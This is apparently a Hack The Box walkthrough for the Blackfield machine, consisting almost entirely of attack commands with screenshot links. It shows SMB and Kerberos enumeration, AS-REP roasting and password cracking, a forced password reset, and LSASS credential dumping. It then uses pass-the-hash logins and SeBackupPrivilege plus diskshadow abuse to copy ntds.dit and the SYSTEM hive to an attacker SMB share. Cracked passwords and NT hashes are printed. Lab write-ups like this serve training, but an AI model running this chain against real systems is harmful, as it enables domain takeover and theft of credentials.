```
nmap -sS -sC -sV -T5 -Pn 10.10.10.192
nmap -sU -T5 10.10.10.192
smbclient -L \\\\10.10.10.192\\
smbclient \\\\10.10.10.192\\profiles$
RECURSE ON
PROMPT OFF
mget *
ls -la | awk -F' ' '{print $9}' > users2.txt
./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d BLACKFIELD.local /home/itsec/Documents/HTB-Blackfield/users2.txt
crackmapexec smb 10.10.10.192 -u users1.txt -p /usr/share/wordlists/rockyou.txt
smbclient -L \\\\10.10.10.192\\ -U BLACKFIELD.local/audit2020@BLACKFIELD.local
./GetNPUsers.py blackfield.local/ -no-pass -usersfile users1.txt -dc-ip 10.10.10.192
john hash1 -w=/usr/share/wordlists/rockyou.txt
neo4j console
bloodhound
git clone https://github.com/dirkjanm/BloodHound.py.git
python3 bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c All
Raw Query: MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
rpcclient -U blackfield/support 10.10.10.192
setuserinfo audit2020 23 H@CKTHEB0X#
crackmapexec smb 10.10.10.192 -u audit2020 -p H@CKTHEB0X# --shares
smbclient \\\\10.10.10.192\\forensic -U BLACKFIELD.local/audit2020
mget *
pypykatz lsa minidump lsass.DMP
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes2
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users2
crackmapexec smb 10.10.10.192 -u users2 -H hashes2
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
whoami /priv
robocopy /b C:\Users\Administrator\Desktop\ C:\
git clone https://github.com/giuliano108/SeBackupPrivilege.git
cd C:\programdata
upload SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
cd C:\windows\system32\config
type netlogon.dns
Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
type \programdata\netlogon.dns
Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt 0xdf.txt
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
https://pentestlab.blog/tag/diskshadow/
unix2dos vss.dsh
upload vss.dsh c:\programdata\vss.dsh
diskshadow /s c:\programdata\vss.dsh
./smbserver.py s . -smb2support -username df -password df
net use \\10.10.14.13\s /u:df df
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.13\s\ntds.dit
Copy-FileSeBackupPrivilege z:\Windows\system32\config\SYSTEM \\10.10.14.6\s\SYSTEM
./secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

```
nmap -sS -sC -sV -T5 -Pn 10.10.10.192
nmap -sU -T5 10.10.10.192
```
![image](https://github.com/regarmulia/HTB/assets/33616880/fbd9d1ba-1de4-40ac-9315-7e4696e0411e)

![image](https://github.com/regarmulia/HTB/assets/33616880/61dfed10-6cd7-4e56-86b3-6de25c80beca)

```
smbclient -L \\\\10.10.10.192\\
smbclient \\\\10.10.10.192\\profiles$

RECURSE ON
PROMPT OFF
mget *
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6270846a-059e-44b7-8ea9-b85e2b4580fe)

```
ls -la | awk -F' ' '{print $9}' > users2.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8356828b-c804-409c-9614-eb7a07575f9c)

```
./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d BLACKFIELD.local /home/itsec/Documents/HTB-Blackfield/users2.txt
audit2020@BLACKFIELD.local
svc_backup@BLACKFIELD.local
support@BLACKFIELD.local
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8351ac91-ddd0-4beb-b7a5-07b826d5ea17)

```
crackmapexec smb 10.10.10.192 -u users1.txt -p /usr/share/wordlists/rockyou.txt
smbclient -L \\\\10.10.10.192\\ -U BLACKFIELD.local/audit2020@BLACKFIELD.local
```
![image](https://github.com/regarmulia/HTB/assets/33616880/85ac138e-3b1c-425d-a7e0-02a1459f064c)

![image](https://github.com/regarmulia/HTB/assets/33616880/8e443d07-17a2-4bb0-9581-bce86b966fce)

```
./GetNPUsers.py blackfield.local/ -no-pass -usersfile users1.txt -dc-ip 10.10.10.192
john hash1 -w=/usr/share/wordlists/rockyou.txt
#00^BlackKnight
```
![image](https://github.com/regarmulia/HTB/assets/33616880/cd8865bb-864f-46ec-a29a-696611744770)

```
neo4j console
bloodhound
git clone https://github.com/dirkjanm/BloodHound.py.git
python3 bloodhound.py -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c All
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5f5252e0-d56f-416b-aaf0-8199b768611d)

![image](https://github.com/regarmulia/HTB/assets/33616880/690ab874-b2ed-44ad-bcb1-7c905f601270)

![image](https://github.com/regarmulia/HTB/assets/33616880/32338d7d-8555-4e26-a012-c3c73abde14f)

```
Raw Query: MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ce0c48d4-04cd-4b3e-a357-3cc24d23fd19)

```
rpcclient -U blackfield/support 10.10.10.192
setuserinfo audit2020 23 H@CKTHEB0X#
```
![image](https://github.com/regarmulia/HTB/assets/33616880/3fcc9b61-e949-403c-b3d0-0f1ba9be236a)

```
crackmapexec smb 10.10.10.192 -u audit2020 -p H@CKTHEB0X# --shares
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c73a397a-31c3-4313-aa78-b82fe0c9cb65)

```
smbclient \\\\10.10.10.192\\forensic -U BLACKFIELD.local/audit2020
mget *
```
![image](https://github.com/regarmulia/HTB/assets/33616880/9cdfea40-0d79-4ece-a450-5ed8604b2335)

![image](https://github.com/regarmulia/HTB/assets/33616880/8c7006c9-71e4-4385-b060-5935ca36c2b1)

![image](https://github.com/regarmulia/HTB/assets/33616880/00b5ff21-a352-44d2-bb4d-edd7d42e6538)

```
pypykatz lsa minidump lsass.DMP
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ac6320b3-ffcf-45b9-978f-fff33a0cb42c)

```
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes2
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users2
```
![image](https://github.com/regarmulia/HTB/assets/33616880/67de1db3-ce5b-473e-bc56-0830ba2c0aa3)

![image](https://github.com/regarmulia/HTB/assets/33616880/5d9c4b09-a763-4a23-9699-47c2fdee4885)

```
crackmapexec smb 10.10.10.192 -u users2 -H hashes2
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```
![image](https://github.com/regarmulia/HTB/assets/33616880/2f3fa841-a28a-4cec-a91c-646e37b6e8eb)

![image](https://github.com/regarmulia/HTB/assets/33616880/40295828-c67e-423a-9faa-709ea9d8f29e)

```
whoami /priv
```
![image](https://github.com/regarmulia/HTB/assets/33616880/99ce04fc-b535-454b-9415-909b01ac2c76)

```
robocopy /b C:\Users\Administrator\Desktop\ C:\
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d74df300-d472-4da8-b81b-ad4f1f632746)

![image](https://github.com/regarmulia/HTB/assets/33616880/d8f521b9-4937-403d-b9e2-d10cb0bfdf00)

```
git clone https://github.com/giuliano108/SeBackupPrivilege.git
cd C:\programdata
upload SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8918071a-bc69-46c9-a0e8-ddce40280dff)

![image](https://github.com/regarmulia/HTB/assets/33616880/c311daad-df7a-4bcc-b229-70f7a2c76260)

```
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
cd C:\windows\system32\config
type netlogon.dns
Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
type \programdata\netlogon.dns
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1c0b388c-25d4-4184-bb14-3c61515f856f)

![image](https://github.com/regarmulia/HTB/assets/33616880/2ee6d268-90fc-47d1-94bd-dc4f77972e9b)

```
Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt 0xdf.txt
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
```
![image](https://github.com/regarmulia/HTB/assets/33616880/fecb8fe9-4740-46b8-a14b-d3479761ef23)

```
https://pentestlab.blog/tag/diskshadow/
upload vss.dsh c:\programdata\vss.dsh
diskshadow /s c:\programdata\vss.dsh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6d7f6af1-934b-4279-b5eb-e8c788d625b4)

![image](https://github.com/regarmulia/HTB/assets/33616880/95425630-c31e-492a-9b94-1ddcd202f19d)

```
unix2dos vss.dsh
```
```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d2c6e1b2-b0fb-4966-b838-a601662324bb)

```
./smbserver.py s . -smb2support -username df -password df
net use \\10.10.14.13\s /u:df df
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.13\s\ntds.dit
Copy-FileSeBackupPrivilege z:\Windows\system32\config\SYSTEM \\10.10.14.6\s\SYSTEM
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ace2cfb7-7a8e-45dd-a6f7-0d9962f32d5b)

![image](https://github.com/regarmulia/HTB/assets/33616880/b5095fad-0969-4aea-8fc9-5f61ff515ed2)

![image](https://github.com/regarmulia/HTB/assets/33616880/03292ed3-ef4c-40d9-824d-d0ad1fea814c)

```
./secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```
![image](https://github.com/regarmulia/HTB/assets/33616880/401b1100-989a-4eb6-861c-617b767fe70e)

```
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```
![image](https://github.com/regarmulia/HTB/assets/33616880/ba294f55-c00a-4a3a-8c26-2111bc1c8a5e)
